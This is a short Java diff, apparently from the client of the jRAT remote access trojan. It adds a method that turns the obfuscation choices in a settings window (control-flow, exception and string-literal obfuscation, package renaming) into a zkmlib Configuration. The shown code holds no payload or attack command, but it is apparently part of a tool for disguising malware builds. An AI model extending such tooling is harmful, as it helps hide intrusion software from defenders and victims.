@@ -18,6 +18,7 @@ import javax.swing.border.EmptyBorder;
 
 import pro.jrat.client.utils.Utils;
 
+import com.redpois0n.zkmlib.Configuration;
 import com.redpois0n.zkmlib.types.EncryptStringLiterals;
 import com.redpois0n.zkmlib.types.ExceptionObfuscation;
 import com.redpois0n.zkmlib.types.ObfuscateFlow;
@@ -171,5 +172,33 @@ public class FrameObfuscationInfo extends BaseFrame {
 		do {
 			random = Utils.randomString(5);
 		} while (Character.isDigit(random.charAt(0)));
+	}
+
+	public Configuration getConfig() {
+		ObfuscateFlow flow = ObfuscateFlow.NONE;
+		
+		for (ObfuscateFlow of : ObfuscateFlow.values()) {
+			if (of.toString().equals(cbObfuscate.getSelectedItem().toString())) {
+				flow = of;
+			}
+		}
+		
+		ExceptionObfuscation exceptionObfuscation = ExceptionObfuscation.NONE;
+		
+		for (ExceptionObfuscation of : ExceptionObfuscation.values()) {
+			if (of.toString().equals(cbExceptions.getSelectedItem().toString())) {
+				exceptionObfuscation = of;
+			}
+		}
+		
+		EncryptStringLiterals strings = EncryptStringLiterals.NONE;
+		
+		for (EncryptStringLiterals of : EncryptStringLiterals.values()) {
+			if (of.toString().equals(cbStrings.getSelectedItem().toString())) {
+				strings = of;
+			}
+		}
+		
+		return new Configuration(null, null, null, flow, exceptionObfuscation, strings, chckbxCollapsePackages.isSelected(), txtPackageName.getText().trim());
 	}
 }
